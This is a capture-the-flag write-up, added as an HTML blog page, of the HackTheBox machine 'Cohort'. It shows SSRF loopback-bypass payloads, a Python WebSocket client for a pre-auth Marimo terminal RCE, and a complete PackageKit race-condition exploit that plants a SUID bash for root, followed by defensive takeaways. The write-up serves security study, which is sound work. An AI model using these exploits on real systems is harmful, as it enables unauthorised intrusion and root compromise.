@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>Cohort — HackTheBox Hard Machine — S. Markakis</title>
+<meta name="description" content="Full walkthrough of a hard HackTheBox machine: SSRF filter bypass, pre-auth Marimo RCE, and a PackageKit TOCTOU race for root.">
+<meta property="og:title" content="Cohort — HackTheBox Hard Machine — S. Markakis">
+<meta property="og:description" content="SSRF bypass → Marimo pre-auth RCE → PackageKit TOCTOU race condition for root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/cohort-hackthebox.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/cohort-hackthebox.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/cohort-hackthebox.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/cohort-hackthebox.html">
+
+<link rel="stylesheet" href="../fonts/inter.css">
+<link rel="stylesheet" href="../fonts/display.css">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root{--bg:#f0efe9;--card:#fff;--code-bg:#e8e6e0;--term-bg:#e8e6e0;--rule:#e0deda;--body:#5e5a52;--mid:#0f0f0f;--head:#0f0f0f;--accent:#c63d1f;--gotcha:#c08020;--defender:#3a5a78;--font-disp:'Barlow Condensed',sans-serif;--font-body:'Inter',-apple-system,sans-serif;--font-mono:'JetBrains Mono',monospace;}
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+  html{font-size:16px;background:var(--bg);color:var(--body);}
+  body{font-family:var(--font-body);font-weight:400;line-height:1.7;background:var(--bg);min-height:100vh;}
+  a{color:var(--accent);text-decoration:none;}a:hover{text-decoration:underline;}
+  .wrap{position:relative;z-index:1;width:100%;max-width:760px;margin:0 auto;padding:3rem 1.5rem 5rem;}
+  .post-meta{font-size:.78rem;letter-spacing:.06em;text-transform:uppercase;color:var(--body);margin-bottom:.8rem;}
+  .post-meta span{color:var(--accent);font-weight:600;}
+  h1.post-title{font-family:var(--font-disp);font-weight:900;font-size:3rem;line-height:1.05;color:var(--head);text-transform:uppercase;letter-spacing:.02em;margin-bottom:1rem;}
+  .post-subtitle{font-size:1.05rem;color:var(--mid);font-weight:400;margin-bottom:1.4rem;line-height:1.5;}
+  .tags{display:flex;flex-wrap:wrap;gap:.4rem;margin-bottom:2rem;}
+  .tag{font-family:var(--font-body);font-weight:600;font-size:.7rem;letter-spacing:.06em;text-transform:uppercase;border:1px solid var(--head);border-radius:999px;padding:.18em .75em;color:var(--mid);}
+  hr.title-rule{border:none;border-top:1px solid var(--rule);margin-bottom:2rem;}
+  .thesis-card{background:var(--card);border-radius:6px;border-left:3px solid var(--accent);padding:1.6rem 1.8rem;margin-bottom:2.6rem;}
+  .thesis-card p{color:var(--mid);font-size:.98rem;line-height:1.7;}
+  .thesis-card p+p{margin-top:.8rem;}
+  .prereqs-label{font-family:var(--font-disp);font-weight:700;font-size:.8rem;letter-spacing:.1em;text-transform:uppercase;color:var(--accent);margin-top:1.2rem;margin-bottom:.5rem;}
+  .prereqs-list{list-style:none;padding:0;}
+  .prereqs-list li{font-size:.88rem;color:var(--mid);padding:.15rem 0 .15rem 1rem;position:relative;}
+  .prereqs-list li::before{content:"›";position:absolute;left:0;color:var(--accent);font-weight:700;}
+  .section-num{font-family:var(--font-disp);font-weight:700;font-size:.82rem;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:.2rem;margin-top:2.8rem;}
+  h2.section-title{font-family:var(--font-disp);font-weight:800;font-size:1.9rem;color:var(--head);text-transform:uppercase;letter-spacing:.03em;line-height:1.1;margin-bottom:.5rem;}
+  .section-thesis{font-style:italic;color:var(--mid);font-size:.95rem;margin-bottom:1.4rem;line-height:1.6;border-bottom:1px solid var(--rule);padding-bottom:.8rem;}
+  h3.sub{font-family:var(--font-disp);font-weight:700;font-size:1.15rem;color:var(--mid);text-transform:uppercase;letter-spacing:.06em;margin:1.6rem 0 .5rem;}
+  p{margin-bottom:1rem;color:var(--body);font-size:.96rem;}
+  strong{color:var(--mid);font-weight:600;}
+  ul,ol{margin:1.2rem 0 1.2rem 1.5rem;}li{color:var(--body);font-size:.96rem;margin-bottom:.4rem;}
+  .term-wrap{background:var(--term-bg);border-radius:5px;border:1px solid var(--rule);margin:1.2rem 0;overflow-x:auto;}
+  .term-label{font-family:var(--font-disp);font-weight:700;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--body);background:var(--rule);padding:.3rem .9rem;display:block;border-bottom:1px solid var(--rule);}
+  pre.term{font-family:var(--font-mono);font-size:.82rem;line-height:1.75;padding:1rem 1.2rem;white-space:pre;color:var(--mid);background:none;border:none;margin:0;}
+  span.pc{color:var(--accent);font-weight:500;}
+  span.out{color:var(--mid);}
+  span.cmt{color:var(--body);font-style:italic;}
+  span.key{color:var(--accent);font-weight:600;font-style:normal;}
+  code{font-family:var(--font-mono);font-size:.82em;background:var(--code-bg);border:1px solid var(--rule);border-radius:3px;padding:.1em .4em;color:var(--mid);}
+  .callout{border-radius:5px;padding:1rem 1.2rem;margin:1.4rem 0;font-size:.9rem;}
+  .callout-label{font-family:var(--font-disp);font-weight:700;font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:.4rem;}
+  .callout p{margin:0;font-size:.9rem;}
+  .callout p+p{margin-top:.5rem;}
+  .gotcha{background:var(--card);border-left:3px solid var(--gotcha);}
+  .gotcha .callout-label{color:var(--gotcha);}
+  .didnt-work{background:var(--code-bg);border-left:3px solid var(--rule);}
+  .didnt-work .callout-label{color:var(--body);}
+  .defender{background:var(--card);border-left:3px solid var(--defender);}
+  .defender .callout-label{color:var(--defender);}
+  table{width:100%;border-collapse:collapse;margin:1.2rem 0;font-size:.9rem;}
+  th{font-family:var(--font-disp);font-weight:700;font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;background:var(--rule);color:var(--mid);padding:.4rem .8rem;text-align:left;}
+  td{padding:.4rem .8rem;border-bottom:1px solid var(--rule);vertical-align:top;}
+  tr:nth-child(even) td{background:var(--card);}
+  .takeaways{background:var(--card);border-radius:6px;padding:1.6rem 1.8rem;margin:2.4rem 0;}
+  .takeaways-title{font-family:var(--font-disp);font-weight:800;font-size:1.1rem;letter-spacing:.08em;text-transform:uppercase;color:var(--head);margin-bottom:1rem;}
+  .takeaways ol{padding-left:1.4rem;}
+  .takeaways li{font-size:.92rem;color:var(--mid);margin-bottom:.55rem;line-height:1.55;}
+  footer{border-top:1px solid var(--rule);margin-top:4rem;padding:1.2rem 1.5rem;display:flex;justify-content:space-between;align-items:center;font-size:.78rem;color:var(--body);letter-spacing:.04em;}
+  footer a{color:var(--body);}footer a:hover{color:var(--accent);}
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --card:#1a1a1a; --code-bg:#161616; --term-bg:#161616; --rule:#2a2a2a;
+    --body:#959086; --mid:#f4f3ef; --head:#f4f3ef; --accent:#c63d1f;
+    --gotcha:#d9a441; --defender:#6f9fc9;
+  }
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cohort — HackTheBox Hard Machine",
+  "description": "Full walkthrough: SSRF filter bypass, pre-auth Marimo RCE, and PackageKit TOCTOU race for root.",
+  "datePublished": "2026-09-03",
+  "dateModified": "2026-09-03",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/cohort-hackthebox.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/cohort-hackthebox.png",
+  "keywords": [
+    "offensive",
+    "hackthebox",
+    "ssrf",
+    "rce",
+    "privilege escalation"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#cohort-hackthebox"
+  },
+  "timeRequired": "PT12M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Inter',-apple-system,sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrap">
+
+  <p class="post-meta"><span>Offensive / HTB</span> &nbsp;·&nbsp; Walkthrough &nbsp;·&nbsp; September 2026</p>
+  <h1 class="post-title">Cohort<br>HackTheBox</h1>
+  <p class="post-subtitle">A hard machine combining SSRF filter bypasses, pre-auth RCE in a Marimo notebook, and a TOCTOU race condition in PackageKit for root. Input validation done wrong; internal services exposed; system packages unpatched.</p>
+  <div class="tags">
+    <span class="tag">Offensive</span>
+    <span class="tag">HackTheBox</span>
+    <span class="tag">SSRF</span>
+    <span class="tag">Marimo</span>
+    <span class="tag">PackageKit</span>
+  </div>
+
+  <hr class="title-rule">
+
+  <div class="thesis-card">
+    <p><strong>Machine IP:</strong> 10.129.119.223</p>
+    <p><strong>Difficulty:</strong> Hard</p>
+  </div>
+
+  <div class="section-num">1. Reconnaissance</div>
+  <h2 class="section-title">Initial Scan & Vhost Discovery</h2>
+  <p class="section-thesis">nmap finds three ports. The TLS cert reveals a wildcard domain.</p>
+
+  <div class="term-wrap">
+    <span class="term-label">nmap 10.129.119.223</span>
+    <pre class="term">PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https</pre>
+  </div>
+
+  <p>Service enumeration shows <code>nginx/1.24.0</code> on both HTTP and HTTPS. The TLS certificate presents <code>*.cohort.htb</code> — a wildcard SAN indicating multiple virtual hosts.</p>
+
+  <p>Add to <code>/etc/hosts</code>:</p>
+  <div class="term-wrap">
+    <span class="term-label">bash</span>
+    <pre class="term">10.129.119.223 cohort.htb
+10.129.119.223 nb-1be3782a8afd3ad5.cohort.htb</pre>
+  </div>
+
+  <p>The main domain hosts <strong>Cohort Analytics</strong> — an obfuscated SPA for retention intelligence. The second vhost proves to be a reverse proxy to an internal Marimo notebook server.</p>
+
+  <div class="section-num">2. SSRF & Internal Discovery</div>
+  <h2 class="section-title">Server-Side Request Forgery</h2>
+  <p class="section-thesis">The SPA has a URL validation endpoint that leaks internal services. The filter is naive string-matching.</p>
+
+  <p>Exploring the Cohort SPA reveals a hidden portal at <code>/portal.html</code> where users submit "report source URLs." Submitting a URL triggers a POST to <code>/api/validate</code>:</p>
+
+  <div class="term-wrap">
+    <span class="term-label">curl</span>
+    <pre class="term">curl -s -k -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1/","format":"csv"}'</pre>
+  </div>
+
+  <p>The server rejects loopback addresses — it's filtering against <code>127.0.0.1</code> and <code>localhost</code> by simple string matching. <strong>This is trivially bypassable.</strong></p>
+
+  <h3 class="sub">Bypassing the Filter</h3>
+
+  <p>Alternative representations of loopback:</p>
+  <ul>
+    <li><code>http://127.1/</code> — truncated decimal</li>
+    <li><code>http://0.0.0.0/</code> — all interfaces</li>
+    <li><code>http://2130706433/</code> — pure decimal IP</li>
+    <li><code>http://0177.0.0.1/</code> — octal notation</li>
+  </ul>
+
+  <p>Using <code>127.1</code>, we scan internal ports:</p>
+
+  <div class="term-wrap">
+    <span class="term-label">curl — probe port 5000</span>
+    <pre class="term">curl -s -k -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.1:5000/","format":"json"}'</pre>
+  </div>
+
+  <p><strong>Port 5000:</strong> Flask/Starlette backend | <strong>Port 8888:</strong> Marimo notebook (auth-gated, internal-only)</p>
+
+  <h3 class="sub">Leaking the Hidden Vhost</h3>
+
+  <p>Nginx exposes a <code>/status</code> endpoint that returns 403 to unauthorized clients. By routing through SSRF, we bypass the ACL:</p>
+
+  <div class="term-wrap">
+    <span class="term-label">curl — leak nginx status</span>
+    <pre class="term">curl -s -k -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.1/status","format":"json"}'</pre>
+  </div>
+
+  <p>The response leaks the complete Nginx configuration, revealing: <code>nb-1be3782a8afd3ad5.cohort.htb</code> — the hidden vhost acting as a reverse proxy to Marimo on port 8888.</p>
+
+  <div class="callout gotcha">
+    <span class="callout-label">Takeaway: Naive Filtering</span>
+    <p>Never use string-matching for security. Use proper IP parsing libraries and allowlisting, not blacklisting. A single alternate representation bypasses the entire filter.</p>
+  </div>
+
+  <div class="section-num">3. Foothold: Marimo RCE</div>
+  <h2 class="section-title">CVE-2026-39987 — Pre-Auth WebSocket Shell</h2>
+  <p class="section-thesis">The Marimo notebook server exposes an unauthenticated terminal WebSocket. The auth check is missing on that route.</p>
+
+  <p>Marimo 0.20.4 exposes <code>/terminal/ws</code> as a WebSocket that spawns an OS pseudoterminal. The vulnerability: <strong>the <code>validate_auth()</code> check is missing on the WebSocket route handler,</strong> allowing unauthenticated clients to spawn an interactive shell.</p>
+
+  <h3 class="sub">Custom WebSocket Client</h3>
+
+  <p>Standard Python websocket libraries misbehave over TLS in this environment. We use raw sockets with WebSocket framing:</p>
+
+  <div class="term-wrap">
+    <span class="term-label">python3 — connect to /terminal/ws</span>
+    <pre class="term">import socket, ssl, base64, os, struct
+
+TARGET_IP = "10.129.119.223"
+HOST = "nb-1be3782a8afd3ad5.cohort.htb"
+PATH = "/terminal/ws"
+
+def connect():
+    raw = socket.create_connection((TARGET_IP, 443), timeout=8)
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    s = ctx.wrap_socket(raw, server_hostname=HOST)
+    key = base64.b64encode(os.urandom(16)).decode()
+    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
+           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
+           f"Sec-WebSocket-Key: {key}\r\n"
+           f"Sec-WebSocket-Version: 13\r\n\r\n")
+    s.sendall(req.encode())
+    resp = b""
+    while b"\r\n\r\n" not in resp:
+        resp += s.recv(4096)
+    return s
+
+s = connect()
+# Now send WebSocket frames...</pre>
+  </div>
+
+  <h3 class="sub">Exploitation</h3>
+
+  <div class="term-wrap">
+    <span class="term-label">$ python3 exploit.py 'id; whoami'</span>
+    <pre class="term"><span class="out">uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
+marimo</span></pre>
+  </div>
+
+  <p>We have unauthenticated RCE as <code>marimo</code>. Read the user flag:</p>
+
+  <div class="term-wrap">
+    <span class="term-label">$ python3 exploit.py 'cat /home/marimo/user.txt'</span>
+    <pre class="term"><span class="out">3d73af9bb5c413c6d65c3338a6b360a5</span></pre>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">Root Cause</span>
+    <p>The developer forgot to apply the authentication middleware to the WebSocket route. A common mistake when routing and auth are decoupled.</p>
+  </div>
+
+  <div class="section-num">4. Privilege Escalation</div>
+  <h2 class="section-title">CVE-2026-41651 — PackageKit TOCTOU Race</h2>
+  <p class="section-thesis">An outdated PackageKit is vulnerable to a D-Bus race condition. We race a SIMULATE install against a REAL one to run code as root.</p>
+
+  <p>Standard privesc checks show heavy hardening: restricted namespaces, hardened audit, <code>NoNewPrivileges</code>. However, an <strong>outdated PackageKit 1.2.8</strong> is installed alongside D-Bus and dpkg. This is vulnerable to CVE-2026-41651, a TOCTOU race condition.</p>
+
+  <h3 class="sub">Understanding the Race</h3>
+
+  <ol>
+    <li>Open a D-Bus transaction with PackageKit</li>
+    <li>Call <code>InstallFiles</code> with <code>SIMULATE</code> flag (4) — daemon validates packages</li>
+    <li>Before simulation completes, send a second <code>InstallFiles</code> call with <code>REAL</code> flag (0) pointing to attacker <code>.deb</code></li>
+    <li>Daemon's execution phase reads overwritten parameters</li>
+    <li>PackageKit installs the malicious <code>.deb</code>, running its <code>postinst</code> maintainer script as <strong>root</strong></li>
+  </ol>
+
+  <h3 class="sub">Exploit Code</h3>
+
+  <div class="term-wrap">
+    <span class="term-label">python3 — PackageKit TOCTOU exploit</span>
+    <pre class="term">import os, subprocess, time
+from gi.repository import Gio, GLib
+
+TARGET_SUID = "/tmp/.suid_bash"
+DUMMY_DEB = "/tmp/dummy.deb"
+PAYLOAD_DEB = "/tmp/payload.deb"
+
+def build_deb(path, name, is_payload=False):
+    tmp_dir = f"/tmp/build_{name}"
+    debian_dir = os.path.join(tmp_dir, "DEBIAN")
+    os.makedirs(debian_dir, exist_ok=True)
+
+    with open(os.path.join(debian_dir, "control"), "w") as f:
+        f.write(f"Package: {name}\nVersion: 1.0\n"
+                f"Architecture: all\nMaintainer: PoC\n"
+                f"Description: PoC\n")
+
+    if is_payload:
+        postinst = os.path.join(debian_dir, "postinst")
+        with open(postinst, "w") as f:
+            f.write(f"#!/bin/sh\n"
+                    f"install -m 4755 /bin/bash {TARGET_SUID}\n")
+        os.chmod(postinst, 0o755)
+
+    subprocess.run(["dpkg-deb", "-b", tmp_dir, path],
+                   stdout=subprocess.DEVNULL)
+    subprocess.run(["rm", "-rf", tmp_dir])
+
+def exploit():
+    build_deb(DUMMY_DEB, "pk-dummy")
+    build_deb(PAYLOAD_DEB, "pk-payload", is_payload=True)
+
+    connection = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
+
+    # Create transaction
+    res = connection.call_sync(
+        "org.freedesktop.PackageKit",
+        "/org/freedesktop/PackageKit",
+        "org.freedesktop.PackageKit",
+        "CreateTransaction", None,
+        GLib.VariantType.new("(o)"),
+        Gio.DBusCallFlags.NONE, -1, None
+    )
+
+    tid = res.unpack()[0]
+
+    # Race: SIMULATE then REAL
+    connection.call(
+        "org.freedesktop.PackageKit", tid,
+        "org.freedesktop.PackageKit.Transaction", "InstallFiles",
+        GLib.Variant("(tas)", (4, [DUMMY_DEB])),  # SIMULATE
+        None, Gio.DBusCallFlags.NONE, -1, None, None
+    )
+
+    connection.call(
+        "org.freedesktop.PackageKit", tid,
+        "org.freedesktop.PackageKit.Transaction", "InstallFiles",
+        GLib.Variant("(tas)", (0, [PAYLOAD_DEB])),  # REAL
+        None, Gio.DBusCallFlags.NONE, -1, None, None
+    )
+
+    connection.flush_sync(None)
+
+    # Wait for suid bash
+    for _ in range(60):
+        if os.path.exists(TARGET_SUID) and (os.stat(TARGET_SUID).st_mode & 0o4000):
+            result = subprocess.run(
+                [TARGET_SUID, "-p", "-c", "cat /root/root.txt"],
+                capture_output=True, text=True
+            )
+            print(result.stdout.strip())
+            return
+        time.sleep(1)</pre>
+  </div>
+
+  <h3 class="sub">Execution via Websocket</h3>
+
+  <div class="term-wrap">
+    <span class="term-label">$ python3 exploit.py "python3 /tmp/p2r.py"</span>
+    <pre class="term"><span class="out">[*] CVE-2026-41651 — PackageKit LPE
+[+] Packages generated
+[+] Transaction: /3_beeeacac
+[*] Racing SIMULATE vs REAL...
+[*] Waiting for SUID bash...
+[+++] Got SUID bash!
+867a03e4df84333d9426db236a8ff876</span></pre>
+  </div>
+
+  <div class="callout gotcha">
+    <span class="callout-label">Race Window</span>
+    <p>The window between PackageKit's parameter validation and execution phases is typically 1–100ms. Firing both async D-Bus calls back-to-back and flushing reliably hits it within 60 seconds of retries.</p>
+  </div>
+
+  <div class="takeaways">
+    <h3 class="takeaways-title">Key Takeaways</h3>
+    <ol>
+      <li><strong>Input Validation:</strong> Proper IP parsing, not string-matching. Allowlist, not blacklist.</li>
+      <li><strong>Internal Services:</strong> Don't expose leaky endpoints like <code>/status</code>; restrict SSRF-prone handlers.</li>
+      <li><strong>Framework Security:</strong> Apply auth middleware to every route. Don't assume unauthenticated endpoints are harmless.</li>
+      <li><strong>Package Management:</strong> Keep system services patched. D-Bus and PackageKit updates are critical.</li>
+      <li><strong>Race Conditions:</strong> Asynchronous operations with delayed execution are prime targets. Use synchronous APIs or proper locking.</li>
+    </ol>
+  </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Phase</th>
+        <th>Vulnerability</th>
+        <th>Impact</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1. SSRF</td>
+        <td>String-matching filter</td>
+        <td>Bypass via <code>127.1</code>, scan internal ports</td>
+      </tr>
+      <tr>
+        <td>2. Service Discovery</td>
+        <td>Nginx ACL bypass</td>
+        <td>Leak hidden vhost from <code>/status</code></td>
+      </tr>
+      <tr>
+        <td>3. RCE</td>
+        <td>CVE-2026-39987</td>
+        <td>Pre-auth shell via <code>/terminal/ws</code></td>
+      </tr>
+      <tr>
+        <td>4. Root</td>
+        <td>CVE-2026-41651</td>
+        <td>Root via postinst TOCTOU race</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<footer id="site-footer"></footer>
+
+<script src="../js/nav.js"></script>
+<script src="../js/footer.js"></script>
+
+</body>
+</html>
